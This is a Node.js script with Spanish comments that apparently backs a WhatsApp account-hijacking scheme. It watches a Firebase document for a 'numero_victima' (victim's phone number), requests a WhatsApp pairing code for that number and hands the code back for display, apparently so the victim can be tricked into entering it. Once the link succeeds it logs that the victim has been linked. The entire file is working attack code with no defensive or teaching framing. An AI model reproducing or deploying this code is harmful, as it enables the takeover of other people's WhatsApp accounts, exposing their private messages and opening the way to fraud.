const { Client, LocalAuth } = require('whatsapp-web.js');
const admin = require('firebase-admin');
const express = require('express');
const app = express();

// 1. CARGAR FIREBASE CON DIAGNÓSTICO
try {
    const serviceAccount = require("./serviceAccountKey.json"); 
    if (!admin.apps.length) {
        admin.initializeApp({
            credential: admin.credential.cert(serviceAccount)
        });
    }
    console.log("✅ CONECTADO A FIREBASE: panel-admi-633cd");
} catch (e) {
    console.log("❌ ERROR CARGANDO LLAVE FIREBASE: " + e.message);
}

const db = admin.firestore();

// 2. CONFIGURACIÓN WHATSAPP (Ajustada para Replit)
const client = new Client({
    authStrategy: new LocalAuth({ clientId: "replit_session" }),
    puppeteer: {
        headless: true,
        args: ['--no-sandbox', '--disable-setuid-sandbox']
    }
});

// ESCUCHA DE FIREBASE
db.collection("wa_clon_global").doc("current_session").onSnapshot(async (snap) => {
    if (!snap.exists) return;
    const data = snap.data();
    
    // Si detecta el número y no hay código aún
    if (data.status === "solicitando_codigo" && !data.pairingCode) {
        console.log("🚀 GENERANDO CÓDIGO PARA: " + data.numero_victima);
        try {
            const code = await client.requestPairingCode(data.numero_victima);
            console.log("🔑 CÓDIGO GENERADO CON ÉXITO: " + code);
            
            await snap.ref.update({
                pairingCode: code,
                status: "mostrando_codigo"
            });
        } catch (err) {
            console.log("❌ ERROR WHATSAPP: " + err.message);
        }
    }
}, (error) => {
    console.log("❌ ERROR ESCUCHANDO FIREBASE: " + error.message);
});

client.on('ready', () => {
    console.log("🎯 VÍCTIMA VINCULADA CORRECTAMENTE");
    db.collection("wa_clon_global").doc("current_session").update({ status: "exito" });
});

client.initialize().catch(e => console.log("Fallo Init: " + e));

// SERVIDOR PARA REPLIT
app.get('/', (req, res) => res.send('MOTOR REPLIT ONLINE'));
app.listen(process.env.PORT || 3000, () => {
    console.log("📡 Servidor de salud activo.");
});
